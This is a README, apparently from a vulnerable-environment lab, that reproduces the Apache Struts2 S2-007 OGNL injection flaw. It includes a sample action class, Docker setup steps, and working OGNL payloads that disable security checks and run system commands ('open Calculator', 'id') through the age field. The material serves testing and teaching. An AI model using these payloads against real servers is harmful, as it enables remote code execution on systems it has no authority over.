# S2-007 Remote Code Execution Vulnerablity

[中文版本(Chinese version)](README.zh-cn.md)

Affected Version: 2.0.0 - 2.2.3

Details: http://struts.apache.org/docs/s2-007.html

## Reference

When dealing with the type conversion error, the error will be stored in the memory, and the OGNL expression injection will be triggered in the subsequent call flow. **There is no need to write `<ActionName> -validation.xml`**.

For example here is a `UserAction`:

```java
(...)
public class UserAction extends ActionSupport {
    private Integer age;
    private String name;
    private String email;

(...)
```

```java
import com.opensymphony.xwork2.ActionSupport;

public class LoginAction extends ActionSupport {
    private String username;
    private String password;
    private int age;

    public String getUsername() {
        return username;
    }

    public String getPassword() {
        return password;
    }

    public int getAge() {
        return age;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String execute() throws Exception{
        if (this.username == null || this.password == null) {
            return "failed";
        }

        if (this.username.equals("admin") && this.password.equals("admin")) {
            return "success";
        }

        return "failed";
    }
}
```

When the user submits age as a string instead of an integer value, the backend uses code to splice `"'" + value + "'"` and then perform OGNL expression analysis on it.

Test POC：
```
'+(#application)+'
```

Payload which bypass the securely configured:

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")) + '
```

## Setup

```
docker-compose build
docker-compose up -d
```

Visit `<host>:8080/login.action` and setup your payload.

## Exploit

Here is the EXP that can execute arbitrary code:

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```

Put EXP into the input box (age), then get the command execution result:

![](1.jpeg)
